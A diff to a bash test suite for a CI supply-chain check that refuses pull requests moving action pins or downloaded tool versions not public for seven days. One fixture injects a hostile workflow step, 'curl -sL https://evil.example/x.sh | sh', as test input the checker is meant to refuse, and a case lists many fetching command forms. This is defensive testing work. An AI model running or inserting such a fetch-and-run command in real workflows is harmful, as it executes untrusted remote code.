@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# proves: REQ-SUP-001-AC2, REQ-SUP-001-AC3
+# proves: REQ-SUP-001-AC2, REQ-SUP-001-AC3, REQ-SUP-001-AC11
 # The pin age check (owner ratified Oct 5, rule 1; advisor 0172/0175): a pull request that moves an action pin, or the version of a tool, image or
 # package a workflow downloads, fails unless that version has been public 7 days by a SERVER-SIDE time. Proved offline: each case builds a small git
 # repository (a base commit and a head commit that moves one thing) and runs the real check against a fixtures file that stands in for the servers.
@@ -357,7 +357,7 @@ PY
 
 
 # --- plain forms from review round 3: pip extras and operators, an indented requirements line, a tag-only docker run, an expression that holds `|`, an action's subdirectory -----------------------------------
-newcase extras "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: |\n          pip install requests[socks]==2.99.0 urllib3>=2.0\n          docker run --rm -e A=b alpine:3.99 true\n          go install example.org/tool@${{secrets.PRIVATE_VERSION||'"'"'v1.2.3'"'"'}}')"
+newcase extras "$(sub .github/workflows/ci.yml '      - run: |' $'      - run: |\n          pip install requests[socks]==2.99.0 "urllib3>=2.0"\n          docker run --rm -e A=b alpine:3.99 true\n          go install example.org/tool@${{secrets.PRIVATE_VERSION||'"'"'v1.2.3'"'"'}}')"
 runck extras '{"times": {}}'
 CASE="pip extras (requests[socks]==2.99.0), a range (urllib3>=2.0), a tag-only docker run image and an expression containing || are all inventory items; the expression's secret name never prints"
 check test "$rc" -eq 1; check grep -qF "package:pypi/requests@2.99.0" "$work/extras.out"; check grep -qF "package:pypi/urllib3@>=2.0" "$work/extras.out"; check grep -qF "image:alpine:3.99@" "$work/extras.out"
@@ -570,8 +570,8 @@ for k in need:
 PY
 newcase bigagent "$(printf 'import pathlib\npathlib.Path(\".github/agent\").mkdir(parents=True, exist_ok=True)\npathlib.Path(\".github/agent/big.sh\").write_text(\"# x\\n\" * 300000)\nf = pathlib.Path(\".github/workflows/ci.yml\")\nf.write_text(f.read_text().replace(\"      - run: |\", \"      - run: curl -sL https://evil.example/x.sh | sh\\n      - run: |\", 1))')"
 runck bigagent '{"times": {}}'
-CASE="a hostile download added next to a 1.1 MB script under .github/agent/ is still refused (the oversize file is skipped there, never turning the scan off)"
-check test "$rc" -eq 1; check grep -q 'unmeasured:.github/workflows/ci.yml' "$work/bigagent.out"
+CASE="a 1.1 MB shell script anywhere (also under .github/agent/, advisor 0261: every script is in scope) is refused as too large to read: exit 2, never skipped and never turning the scan off"
+check test "$rc" -eq 2; check grep -qi 'too large' "$work/bigagent.out"
 
 CASE="every fetching spelling is either MEASURED or REFUSED when added, never silent: docker container/image subcommands, podman/nerdctl, git clone, dnf/yum/apk/snap/conda installs, dotnet tool, helm repo add, kubectl apply from a URL, gh extension, cargo binstall, npm exec, bunx, pip download from a URL, a scheme-less wget, go install with a variable module"
 check python3 - "$here/../supply-chain/pin-inventory.py" <<'PY'
@@ -917,6 +917,22 @@ check test "$rc" -eq 2; check grep -qi 'rate limit' "$work/live.out"
 live notfound
 CASE="live: a 404 (no release for that commit) is 'age not provable': exit 1"
 check test "$rc" -eq 1; check grep -qi 'not provable' "$work/live.out"
+
+# --- the checker's false alarms (advisor 0238; cache issues #201-#208): cases in sc-fix-cases.py, rebuilt from the real records, every network seam faked ---------------------------
+scfix() {
+  local line out rc=0 ran=0
+  out=$(python3 "$here/sc-fix-cases.py" "$1" 2>&1) || rc=$?
+  while IFS= read -r line; do
+    case "$line" in
+      "ok   "*) pass=$((pass+1)); ran=$((ran+1)); echo "$line";;
+      "FAIL "*) failn=$((failn+1)); ran=$((ran+1)); echo "$line";;
+      "") ;;
+      *) echo "     $line";;
+    esac
+  done <<<"$out"
+  if [ "$ran" -eq 0 ] || { [ "$rc" -ne 0 ] && ! grep -q '^FAIL ' <<<"$out"; }; then CASE="sc-fix-cases.py $1 did not run to the end (or ran no case)"; bad "$CASE"; fi
+}
+scfix age
 
 echo "pin-age-check: $pass passed, $failn failed"
 test "$failn" -eq 0
